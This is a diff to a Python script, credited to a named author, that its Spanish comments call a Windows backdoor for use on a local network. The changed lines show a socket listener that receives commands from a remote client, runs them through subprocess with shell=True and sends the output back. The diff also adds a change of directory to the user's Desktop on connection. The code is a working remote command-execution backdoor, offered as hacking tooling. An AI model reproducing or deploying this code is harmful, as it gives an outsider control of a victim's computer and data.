@@ -7,6 +7,8 @@ from re import match
 
 # codigo para puerta trasera (solo windows)
 # pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server
+# no esta preparado para escuchar fuera de la red privada, no recomiendo
+# "Estamos hack" - Autor: Matias Urbaneja (Urb@n) - # https://github.com/Urban20
 
 def IPV4():
     'intenta obtener la direccion ipv4 de la maquina'
@@ -25,7 +27,7 @@ def escucha(cliente):
     try:
         señal = cliente.recv(1024).decode()
         if match('cd ',señal.lower()):
-            ruta = señal[2:]
+            ruta = señal[2:].strip()
             try:
                 os.chdir(ruta.strip())
 
@@ -33,8 +35,8 @@ def escucha(cliente):
             except Exception as e:
                 cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
         else:
-            comando = subprocess.check_output(señal.split(' '),text=True,shell=True)
-            cliente.send(comando.encode())
+            comando = subprocess.check_output(señal.split(' '),text=True,shell=True) # comando recibido por el cliente
+            cliente.send(comando.encode()) # envio de la salida del backdoor al cliente
     except ConnectionResetError:
         main()
     except:
@@ -52,6 +54,7 @@ def main():
             s.listen()
             cliente,sv=s.accept()
             if n == 0:
+                os.chdir(f'{os.environ.get('USERPROFILE')}\\Desktop')
                 print('\n[*] conectado\n')
             threading.Thread(target=escucha,args=(cliente,)).start()
 
